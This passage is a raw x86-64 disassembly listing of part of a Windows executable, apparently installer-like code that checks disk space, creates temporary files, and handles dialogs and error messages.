   140005e02:	44 89 6c 24 44       	mov    %r13d,0x44(%rsp)
   140005e07:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140005e0c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e11:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140005e16:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140005e1b:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   140005e20:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   140005e25:	44 89 6c 24 50       	mov    %r13d,0x50(%rsp)
   140005e2a:	48 ff 15 9f 56 00 00 	rex.W call *0x569f(%rip)        # 0x14000b4d0
   140005e31:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e36:	85 c0                	test   %eax,%eax
   140005e38:	0f 84 de 01 00 00    	je     0x14000601c
   140005e3e:	44 8b 74 24 40       	mov    0x40(%rsp),%r14d
   140005e43:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140005e49:	44 0f af 74 24 44    	imul   0x44(%rsp),%r14d
   140005e4f:	8b 54 24 48          	mov    0x48(%rsp),%edx
   140005e53:	41 8b ce             	mov    %r14d,%ecx
   140005e56:	48 ff 15 5b 56 00 00 	rex.W call *0x565b(%rip)        # 0x14000b4b8
   140005e5d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005e62:	8b f0                	mov    %eax,%esi
   140005e64:	85 c0                	test   %eax,%eax
   140005e66:	0f 84 b0 01 00 00    	je     0x14000601c
   140005e6c:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   140005e71:	48 8d 44 24 4c       	lea    0x4c(%rsp),%rax
   140005e76:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140005e7b:	45 33 c9             	xor    %r9d,%r9d
   140005e7e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005e83:	45 33 c0             	xor    %r8d,%r8d
   140005e86:	48 8d 44 24 54       	lea    0x54(%rsp),%rax
   140005e8b:	33 d2                	xor    %edx,%edx
   140005e8d:	33 c9                	xor    %ecx,%ecx
   140005e8f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e94:	48 ff 15 4d 55 00 00 	rex.W call *0x554d(%rip)        # 0x14000b3e8
   140005e9b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ea0:	85 c0                	test   %eax,%eax
   140005ea2:	75 5f                	jne    0x140005f03
   140005ea4:	bb 00 02 00 00       	mov    $0x200,%ebx
   140005ea9:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140005ead:	44 8b c3             	mov    %ebx,%r8d
   140005eb0:	33 d2                	xor    %edx,%edx
   140005eb2:	e8 ef bc ff ff       	call   0x140001ba6
   140005eb7:	e8 c4 08 00 00       	call   0x140006780
   140005ebc:	89 05 c2 97 00 00    	mov    %eax,0x97c2(%rip)        # 0x14000f684
   140005ec2:	48 ff 15 1f 54 00 00 	rex.W call *0x541f(%rip)        # 0x14000b2e8
   140005ec9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ece:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140005ed3:	45 33 c9             	xor    %r9d,%r9d
   140005ed6:	44 8b c0             	mov    %eax,%r8d
   140005ed9:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140005edd:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140005ee1:	33 d2                	xor    %edx,%edx
   140005ee3:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140005ee8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005eed:	48 ff 15 94 55 00 00 	rex.W call *0x5594(%rip)        # 0x14000b488
   140005ef4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005ef9:	ba f9 04 00 00       	mov    $0x4f9,%edx
   140005efe:	e9 73 01 00 00       	jmp    0x140006076
   140005f03:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140005f08:	48 ff 15 01 55 00 00 	rex.W call *0x5501(%rip)        # 0x14000b410
   140005f0f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005f14:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140005f1a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140005f1f:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140005f24:	48 2b f8             	sub    %rax,%rdi
   140005f27:	41 8d 48 fb          	lea    -0x5(%r8),%ecx
   140005f2b:	49 8d 40 fc          	lea    -0x4(%r8),%rax
   140005f2f:	48 85 c0             	test   %rax,%rax
   140005f32:	74 11                	je     0x140005f45
   140005f34:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140005f37:	84 c0                	test   %al,%al
   140005f39:	74 0a                	je     0x140005f45
   140005f3b:	88 02                	mov    %al,(%rdx)
   140005f3d:	48 03 d1             	add    %rcx,%rdx
   140005f40:	4c 2b c1             	sub    %rcx,%r8
   140005f43:	75 e6                	jne    0x140005f2b
   140005f45:	4d 85 c0             	test   %r8,%r8
   140005f48:	48 8d 42 ff          	lea    -0x1(%rdx),%rax
   140005f4c:	bb 00 02 00 00       	mov    $0x200,%ebx
   140005f51:	48 0f 45 c2          	cmovne %rdx,%rax
   140005f55:	44 88 28             	mov    %r13b,(%rax)
   140005f58:	41 0f b7 c5          	movzwl %r13w,%eax
   140005f5c:	44 3b f3             	cmp    %ebx,%r14d
   140005f5f:	74 31                	je     0x140005f92
   140005f61:	03 db                	add    %ebx,%ebx
   140005f63:	66 03 c1             	add    %cx,%ax
   140005f66:	66 83 f8 08          	cmp    $0x8,%ax
   140005f6a:	72 f0                	jb     0x140005f5c
   140005f6c:	75 24                	jne    0x140005f92
   140005f6e:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140005f73:	45 33 c9             	xor    %r9d,%r9d
   140005f76:	45 33 c0             	xor    %r8d,%r8d
   140005f79:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140005f80:	00 
   140005f81:	ba c5 04 00 00       	mov    $0x4c5,%edx
   140005f86:	33 c9                	xor    %ecx,%ecx
   140005f88:	e8 4b 04 00 00       	call   0x1400063d8
   140005f8d:	e9 10 01 00 00       	jmp    0x1400060a2
   140005f92:	f6 05 0b a0 00 00 08 	testb  $0x8,0xa00b(%rip)        # 0x14000ffa4
   140005f99:	74 2d                	je     0x140005fc8
   140005f9b:	f7 44 24 4c 00 80 00 	testl  $0x8000,0x4c(%rsp)
   140005fa2:	00 
   140005fa3:	74 23                	je     0x140005fc8
   140005fa5:	44 8b 05 fc 9f 00 00 	mov    0x9ffc(%rip),%r8d        # 0x14000ffa8
   140005fac:	48 8d 15 4d 8e 00 00 	lea    0x8e4d(%rip),%rdx        # 0x14000ee00
   140005fb3:	0f b7 c0             	movzwl %ax,%eax
   140005fb6:	41 c1 e8 02          	shr    $0x2,%r8d
   140005fba:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   140005fbd:	03 d2                	add    %edx,%edx
   140005fbf:	44 03 05 e2 9f 00 00 	add    0x9fe2(%rip),%r8d        # 0x14000ffa8
   140005fc6:	eb 14                	jmp    0x140005fdc
   140005fc8:	44 8b 05 d9 9f 00 00 	mov    0x9fd9(%rip),%r8d        # 0x14000ffa8
   140005fcf:	48 8d 15 2a 8e 00 00 	lea    0x8e2a(%rip),%rdx        # 0x14000ee00
   140005fd6:	0f b7 c0             	movzwl %ax,%eax
   140005fd9:	8b 14 82             	mov    (%rdx,%rax,4),%edx
   140005fdc:	41 8b c7             	mov    %r15d,%eax
   140005fdf:	83 e0 03             	and    $0x3,%eax
   140005fe2:	3c 03                	cmp    $0x3,%al
   140005fe4:	75 1a                	jne    0x140006000
   140005fe6:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
   140005fea:	3b c6                	cmp    %esi,%eax
   140005fec:	76 20                	jbe    0x14000600e
   140005fee:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140005ff3:	41 8b cc             	mov    %r12d,%ecx
   140005ff6:	e8 89 ca ff ff       	call   0x140002a84
   140005ffb:	e9 a4 00 00 00       	jmp    0x1400060a4
   140006000:	44 84 f9             	test   %r15b,%cl
   140006003:	74 04                	je     0x140006009
   140006005:	3b d6                	cmp    %esi,%edx
   140006007:	eb e3                	jmp    0x140005fec
   140006009:	44 3b c6             	cmp    %esi,%r8d
   14000600c:	eb de                	jmp    0x140005fec
   14000600e:	44 89 2d 6f 96 00 00 	mov    %r13d,0x966f(%rip)        # 0x14000f684
   140006015:	8b c1                	mov    %ecx,%eax
   140006017:	e9 88 00 00 00       	jmp    0x1400060a4
   14000601c:	bb 00 02 00 00       	mov    $0x200,%ebx
   140006021:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140006025:	44 8b c3             	mov    %ebx,%r8d
   140006028:	33 d2                	xor    %edx,%edx
   14000602a:	e8 77 bb ff ff       	call   0x140001ba6
   14000602f:	e8 4c 07 00 00       	call   0x140006780
   140006034:	89 05 4a 96 00 00    	mov    %eax,0x964a(%rip)        # 0x14000f684
   14000603a:	48 ff 15 a7 52 00 00 	rex.W call *0x52a7(%rip)        # 0x14000b2e8
   140006041:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006046:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000604b:	45 33 c9             	xor    %r9d,%r9d
   14000604e:	44 8b c0             	mov    %eax,%r8d
   140006051:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006055:	48 8d 45 70          	lea    0x70(%rbp),%rax
   140006059:	33 d2                	xor    %edx,%edx
   14000605b:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140006060:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006065:	48 ff 15 1c 54 00 00 	rex.W call *0x541c(%rip)        # 0x14000b488
   14000606c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006071:	ba b0 04 00 00       	mov    $0x4b0,%edx
   140006076:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000607b:	4c 8d 4d 70          	lea    0x70(%rbp),%r9
   14000607f:	4c 8b c7             	mov    %rdi,%r8
   140006082:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006089:	00 
   14000608a:	33 c9                	xor    %ecx,%ecx
   14000608c:	e8 47 03 00 00       	call   0x1400063d8
   140006091:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140006096:	48 ff 15 73 53 00 00 	rex.W call *0x5373(%rip)        # 0x14000b410
   14000609d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400060a2:	33 c0                	xor    %eax,%eax
   1400060a4:	48 8b 8d 70 02 00 00 	mov    0x270(%rbp),%rcx
   1400060ab:	48 33 cc             	xor    %rsp,%rcx
   1400060ae:	e8 fd 3a 00 00       	call   0x140009bb0
   1400060b3:	4c 8d 9c 24 80 03 00 	lea    0x380(%rsp),%r11
   1400060ba:	00 
   1400060bb:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400060bf:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1400060c3:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   1400060c7:	49 8b e3             	mov    %r11,%rsp
   1400060ca:	41 5f                	pop    %r15
   1400060cc:	41 5e                	pop    %r14
   1400060ce:	41 5d                	pop    %r13
   1400060d0:	41 5c                	pop    %r12
   1400060d2:	5d                   	pop    %rbp
   1400060d3:	c3                   	ret
   1400060d4:	cc                   	int3
   1400060d5:	cc                   	int3
   1400060d6:	cc                   	int3
   1400060d7:	cc                   	int3
   1400060d8:	cc                   	int3
   1400060d9:	cc                   	int3
   1400060da:	cc                   	int3
   1400060db:	cc                   	int3
   1400060dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400060e1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400060e6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400060eb:	57                   	push   %rdi
   1400060ec:	48 83 ec 40          	sub    $0x40,%rsp
   1400060f0:	48 8b e9             	mov    %rcx,%rbp
   1400060f3:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1400060f7:	48 ff c7             	inc    %rdi
   1400060fa:	80 3c 0f 00          	cmpb   $0x0,(%rdi,%rcx,1)
   1400060fe:	75 f7                	jne    0x1400060f7
   140006100:	83 c7 14             	add    $0x14,%edi
   140006103:	b9 40 00 00 00       	mov    $0x40,%ecx
   140006108:	8b d7                	mov    %edi,%edx
   14000610a:	8b df                	mov    %edi,%ebx
   14000610c:	48 ff 15 ad 53 00 00 	rex.W call *0x53ad(%rip)        # 0x14000b4c0
   140006113:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006118:	48 8b f0             	mov    %rax,%rsi
   14000611b:	48 85 c0             	test   %rax,%rax
   14000611e:	75 41                	jne    0x140006161
   140006120:	21 44 24 28          	and    %eax,0x28(%rsp)
   140006124:	45 33 c9             	xor    %r9d,%r9d
   140006127:	45 33 c0             	xor    %r8d,%r8d
   14000612a:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140006131:	00 
   140006132:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140006137:	33 c9                	xor    %ecx,%ecx
   140006139:	e8 9a 02 00 00       	call   0x1400063d8
   14000613e:	e8 3d 06 00 00       	call   0x140006780
   140006143:	89 05 3b 95 00 00    	mov    %eax,0x953b(%rip)        # 0x14000f684
   140006149:	33 c0                	xor    %eax,%eax
   14000614b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006150:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006155:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000615a:	48 83 c4 40          	add    $0x40,%rsp
   14000615e:	5f                   	pop    %rdi
   14000615f:	c3                   	ret
   140006160:	cc                   	int3
   140006161:	85 ff                	test   %edi,%edi
   140006163:	74 44                	je     0x1400061a9
   140006165:	48 81 fb ff ff ff 7f 	cmp    $0x7fffffff,%rbx
   14000616c:	77 38                	ja     0x1400061a6
   14000616e:	ba fe ff ff 7f       	mov    $0x7ffffffe,%edx
   140006173:	4c 8b c5             	mov    %rbp,%r8
   140006176:	48 2b d3             	sub    %rbx,%rdx
   140006179:	48 8b ce             	mov    %rsi,%rcx
   14000617c:	4c 2b c6             	sub    %rsi,%r8
   14000617f:	48 8d 04 1a          	lea    (%rdx,%rbx,1),%rax
   140006183:	48 85 c0             	test   %rax,%rax
   140006186:	74 13                	je     0x14000619b
   140006188:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   14000618c:	84 c0                	test   %al,%al
   14000618e:	74 0b                	je     0x14000619b
   140006190:	88 01                	mov    %al,(%rcx)
   140006192:	48 ff c1             	inc    %rcx
   140006195:	48 83 eb 01          	sub    $0x1,%rbx
   140006199:	75 e4                	jne    0x14000617f
   14000619b:	48 85 db             	test   %rbx,%rbx
   14000619e:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   1400061a2:	48 0f 45 c1          	cmovne %rcx,%rax
   1400061a6:	c6 00 00             	movb   $0x0,(%rax)
   1400061a9:	4c 8d 05 38 5a 00 00 	lea    0x5a38(%rip),%r8        # 0x14000bbe8
   1400061b0:	8b d7                	mov    %edi,%edx
   1400061b2:	48 8b ce             	mov    %rsi,%rcx
   1400061b5:	e8 22 34 00 00       	call   0x1400095dc
   1400061ba:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400061c0:	45 33 c9             	xor    %r9d,%r9d
   1400061c3:	c7 44 24 28 80 00 00 	movl   $0x4000080,0x28(%rsp)
   1400061ca:	04 
   1400061cb:	45 33 c0             	xor    %r8d,%r8d
   1400061ce:	ba 00 00 00 40       	mov    $0x40000000,%edx
   1400061d3:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400061da:	00 
   1400061db:	48 8b ce             	mov    %rsi,%rcx
   1400061de:	48 ff 15 43 52 00 00 	rex.W call *0x5243(%rip)        # 0x14000b428
   1400061e5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400061ea:	48 8b ce             	mov    %rsi,%rcx
   1400061ed:	48 8b d8             	mov    %rax,%rbx
   1400061f0:	48 ff 15 61 51 00 00 	rex.W call *0x5161(%rip)        # 0x14000b358
   1400061f7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400061fc:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140006200:	0f 84 38 ff ff ff    	je     0x14000613e
   140006206:	48 8b cb             	mov    %rbx,%rcx
   140006209:	48 ff 15 10 51 00 00 	rex.W call *0x5110(%rip)        # 0x14000b320
   140006210:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006215:	48 8b cd             	mov    %rbp,%rcx
   140006218:	48 ff 15 d1 50 00 00 	rex.W call *0x50d1(%rip)        # 0x14000b2f0
   14000621f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006224:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006227:	0f 84 11 ff ff ff    	je     0x14000613e
   14000622d:	a8 10                	test   $0x10,%al
   14000622f:	0f 84 09 ff ff ff    	je     0x14000613e
   140006235:	83 25 48 94 00 00 00 	andl   $0x0,0x9448(%rip)        # 0x14000f684
   14000623c:	b8 01 00 00 00       	mov    $0x1,%eax
   140006241:	e9 05 ff ff ff       	jmp    0x14000614b
   140006246:	cc                   	int3
   140006247:	cc                   	int3
   140006248:	cc                   	int3
   140006249:	cc                   	int3
   14000624a:	cc                   	int3
   14000624b:	cc                   	int3
   14000624c:	cc                   	int3
   14000624d:	cc                   	int3
   14000624e:	cc                   	int3
   14000624f:	cc                   	int3
   140006250:	40 53                	rex push %rbx
   140006252:	48 83 ec 30          	sub    $0x30,%rsp
   140006256:	48 8b d9             	mov    %rcx,%rbx
   140006259:	83 ea 0f             	sub    $0xf,%edx
   14000625c:	0f 84 ea 00 00 00    	je     0x14000634c
   140006262:	83 ea 01             	sub    $0x1,%edx
   140006265:	74 27                	je     0x14000628e
   140006267:	81 ea 00 01 00 00    	sub    $0x100,%edx
   14000626d:	74 32                	je     0x1400062a1
   14000626f:	83 fa 01             	cmp    $0x1,%edx
   140006272:	0f 85 08 01 00 00    	jne    0x140006380
   140006278:	49 83 f8 06          	cmp    $0x6,%r8
   14000627c:	75 06                	jne    0x140006284
   14000627e:	41 8d 50 fb          	lea    -0x5(%r8),%edx
   140006282:	eb 0c                	jmp    0x140006290
   140006284:	49 83 f8 07          	cmp    $0x7,%r8
   140006288:	0f 85 b7 00 00 00    	jne    0x140006345
   14000628e:	33 d2                	xor    %edx,%edx
   140006290:	48 ff 15 51 53 00 00 	rex.W call *0x5351(%rip)        # 0x14000b5e8
   140006297:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000629c:	e9 a4 00 00 00       	jmp    0x140006345
   1400062a1:	48 ff 15 18 53 00 00 	rex.W call *0x5318(%rip)        # 0x14000b5c0
   1400062a8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400062ad:	48 8b d0             	mov    %rax,%rdx
   1400062b0:	48 8b cb             	mov    %rbx,%rcx
   1400062b3:	e8 70 db ff ff       	call   0x140003e28
   1400062b8:	4c 8b 05 b1 8e 00 00 	mov    0x8eb1(%rip),%r8        # 0x14000f170
   1400062bf:	ba 34 08 00 00       	mov    $0x834,%edx
   1400062c4:	48 8b cb             	mov    %rbx,%rcx
   1400062c7:	48 ff 15 02 53 00 00 	rex.W call *0x5302(%rip)        # 0x14000b5d0
   1400062ce:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400062d3:	48 8d 15 de 93 00 00 	lea    0x93de(%rip),%rdx        # 0x14000f6b8
   1400062da:	48 8b cb             	mov    %rbx,%rcx
   1400062dd:	48 ff 15 74 53 00 00 	rex.W call *0x5374(%rip)        # 0x14000b658
   1400062e4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400062e9:	48 8b cb             	mov    %rbx,%rcx
   1400062ec:	48 ff 15 25 53 00 00 	rex.W call *0x5325(%rip)        # 0x14000b618
   1400062f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400062f8:	ba 34 08 00 00       	mov    $0x834,%edx
   1400062fd:	48 8b cb             	mov    %rbx,%rcx
   140006300:	48 ff 15 31 53 00 00 	rex.W call *0x5331(%rip)        # 0x14000b638
   140006307:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000630c:	48 8b c8             	mov    %rax,%rcx
   14000630f:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   140006314:	48 8b d8             	mov    %rax,%rbx
   140006317:	48 ff 15 0a 53 00 00 	rex.W call *0x530a(%rip)        # 0x14000b628
   14000631e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006323:	4c 8d 05 66 00 00 00 	lea    0x66(%rip),%r8        # 0x140006390
   14000632a:	ba fc ff ff ff       	mov    $0xfffffffc,%edx
   14000632f:	48 8b cb             	mov    %rbx,%rcx
   140006332:	48 89 05 97 89 00 00 	mov    %rax,0x8997(%rip)        # 0x14000ecd0
   140006339:	48 ff 15 e0 52 00 00 	rex.W call *0x52e0(%rip)        # 0x14000b620
   140006340:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006345:	b8 01 00 00 00       	mov    $0x1,%eax
   14000634a:	eb 36                	jmp    0x140006382
   14000634c:	83 3d 2d 86 00 00 00 	cmpl   $0x0,0x862d(%rip)        # 0x14000e980
   140006353:	75 2b                	jne    0x140006380
   140006355:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000635b:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000635f:	ba 34 08 00 00       	mov    $0x834,%edx
   140006364:	41 b8 b1 00 00 00    	mov    $0xb1,%r8d
   14000636a:	48 ff 15 d7 52 00 00 	rex.W call *0x52d7(%rip)        # 0x14000b648
   140006371:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006376:	c7 05 00 86 00 00 01 	movl   $0x1,0x8600(%rip)        # 0x14000e980
   14000637d:	00 00 00 
   140006380:	33 c0                	xor    %eax,%eax
   140006382:	48 83 c4 30          	add    $0x30,%rsp
   140006386:	5b                   	pop    %rbx
   140006387:	c3                   	ret
   140006388:	cc                   	int3
   140006389:	cc                   	int3
   14000638a:	cc                   	int3
   14000638b:	cc                   	int3
   14000638c:	cc                   	int3
   14000638d:	cc                   	int3
   14000638e:	cc                   	int3
   14000638f:	cc                   	int3
   140006390:	48 83 ec 38          	sub    $0x38,%rsp
   140006394:	81 fa b1 00 00 00    	cmp    $0xb1,%edx
   14000639a:	75 0f                	jne    0x1400063ab
   14000639c:	4d 85 c0             	test   %r8,%r8
   14000639f:	75 0a                	jne    0x1400063ab
   1400063a1:	49 83 f9 fe          	cmp    $0xfffffffffffffffe,%r9
   1400063a5:	75 04                	jne    0x1400063ab
   1400063a7:	33 c0                	xor    %eax,%eax
   1400063a9:	eb 21                	jmp    0x1400063cc
   1400063ab:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400063b0:	4d 8b c8             	mov    %r8,%r9
   1400063b3:	44 8b c2             	mov    %edx,%r8d
   1400063b6:	48 8b d1             	mov    %rcx,%rdx
   1400063b9:	48 8b 0d 10 89 00 00 	mov    0x8910(%rip),%rcx        # 0x14000ecd0
   1400063c0:	48 ff 15 99 52 00 00 	rex.W call *0x5299(%rip)        # 0x14000b660
   1400063c7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400063cc:	48 83 c4 38          	add    $0x38,%rsp
   1400063d0:	c3                   	ret
   1400063d1:	cc                   	int3
   1400063d2:	cc                   	int3
   1400063d3:	cc                   	int3
   1400063d4:	cc                   	int3
   1400063d5:	cc                   	int3
   1400063d6:	cc                   	int3
   1400063d7:	cc                   	int3
   1400063d8:	40 55                	rex push %rbp
   1400063da:	53                   	push   %rbx
   1400063db:	56                   	push   %rsi
   1400063dc:	57                   	push   %rdi
   1400063dd:	41 54                	push   %r12
   1400063df:	41 56                	push   %r14
   1400063e1:	41 57                	push   %r15
   1400063e3:	48 8d ac 24 80 fe ff 	lea    -0x180(%rsp),%rbp
   1400063ea:	ff 
   1400063eb:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   1400063f2:	48 8b 05 87 7c 00 00 	mov    0x7c87(%rip),%rax        # 0x14000e080
   1400063f9:	48 33 c4             	xor    %rsp,%rax
   1400063fc:	48 89 85 70 01 00 00 	mov    %rax,0x170(%rbp)
   140006403:	f6 05 4e 8a 00 00 01 	testb  $0x1,0x8a4e(%rip)        # 0x14000ee58
   14000640a:	4d 8b f1             	mov    %r9,%r14
   14000640d:	0f 10 05 2c 57 00 00 	movups 0x572c(%rip),%xmm0        # 0x14000bb40
   140006414:	8b 05 56 57 00 00    	mov    0x5756(%rip),%eax        # 0x14000bb70
   14000641a:	49 8b f0             	mov    %r8,%rsi
   14000641d:	0f 10 0d 2c 57 00 00 	movups 0x572c(%rip),%xmm1        # 0x14000bb50
   140006424:	89 44 24 60          	mov    %eax,0x60(%rsp)
   140006428:	4c 8b e1             	mov    %rcx,%r12
   14000642b:	8a 05 43 57 00 00    	mov    0x5743(%rip),%al        # 0x14000bb74
   140006431:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140006436:	88 44 24 64          	mov    %al,0x64(%rsp)
   14000643a:	0f 10 05 1f 57 00 00 	movups 0x571f(%rip),%xmm0        # 0x14000bb60
   140006441:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140006446:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000644b:	0f 85 1f 02 00 00    	jne    0x140006670
   140006451:	48 8b 0d 58 9b 00 00 	mov    0x9b58(%rip),%rcx        # 0x14000ffb0
   140006458:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   14000645d:	41 b9 00 02 00 00    	mov    $0x200,%r9d
   140006463:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   140006468:	48 ff 15 89 51 00 00 	rex.W call *0x5189(%rip)        # 0x14000b5f8
   14000646f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006474:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   140006479:	75 42                	jne    0x1400064bd
   14000647b:	e8 a0 34 00 00       	call   0x140009920
   140006480:	85 c0                	test   %eax,%eax
   140006482:	74 0f                	je     0x140006493
   140006484:	e8 bb 33 00 00       	call   0x140009844
   140006489:	41 b9 10 00 19 00    	mov    $0x190010,%r9d
   14000648f:	85 c0                	test   %eax,%eax
   140006491:	75 06                	jne    0x140006499
   140006493:	41 b9 10 00 01 00    	mov    $0x10010,%r9d
   140006499:	4c 8d 05 18 92 00 00 	lea    0x9218(%rip),%r8        # 0x14000f6b8
   1400064a0:	49 8b cc             	mov    %r12,%rcx
   1400064a3:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400064a8:	48 ff 15 a1 51 00 00 	rex.W call *0x51a1(%rip)        # 0x14000b650
   1400064af:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400064b4:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400064b8:	e9 b8 01 00 00       	jmp    0x140006675
   1400064bd:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400064c1:	48 8b c3             	mov    %rbx,%rax
   1400064c4:	4d 85 f6             	test   %r14,%r14
   1400064c7:	74 70                	je     0x140006539
   1400064c9:	48 ff c0             	inc    %rax
   1400064cc:	41 80 3c 06 00       	cmpb   $0x0,(%r14,%rax,1)
   1400064d1:	75 f6                	jne    0x1400064c9
   1400064d3:	48 8b cb             	mov    %rbx,%rcx
   1400064d6:	48 ff c1             	inc    %rcx
   1400064d9:	80 3c 0e 00          	cmpb   $0x0,(%rsi,%rcx,1)
   1400064dd:	75 f7                	jne    0x1400064d6
   1400064df:	48 03 c1             	add    %rcx,%rax
   1400064e2:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400064e7:	48 8b cb             	mov    %rbx,%rcx
   1400064ea:	48 ff c1             	inc    %rcx
   1400064ed:	80 3c 0a 00          	cmpb   $0x0,(%rdx,%rcx,1)
   1400064f1:	75 f7                	jne    0x1400064ea
   1400064f3:	48 83 c0 64          	add    $0x64,%rax
   1400064f7:	48 03 c1             	add    %rcx,%rax
   1400064fa:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400064ff:	8b d0                	mov    %eax,%edx
   140006501:	44 8b f8             	mov    %eax,%r15d
   140006504:	48 ff 15 b5 4f 00 00 	rex.W call *0x4fb5(%rip)        # 0x14000b4c0
   14000650b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140006510:	48 8b f8             	mov    %rax,%rdi
   140006513:	48 85 c0             	test   %rax,%rax
   140006516:	0f 84 95 00 00 00    	je     0x1400065b1
   14000651c:	4c 8b ce             	mov    %rsi,%r9
   14000651f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140006524:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140006529:	41 8b d7             	mov    %r15d,%edx
   14000652c:	48 8b c8             	mov    %rax,%rcx
   14000652f:	e8 14 d3 ff ff       	call   0x140003848
   140006534:	e9 ca 00 00 00       	jmp    0x140006603
   140006539:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000653e:	48 ff c0             	inc    %rax
   140006541:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140006545:	75 f7                	jne    0x14000653e
   140006547:	48 85 f6             	test   %rsi,%rsi
   14000654a:	74 46                	je     0x140006592
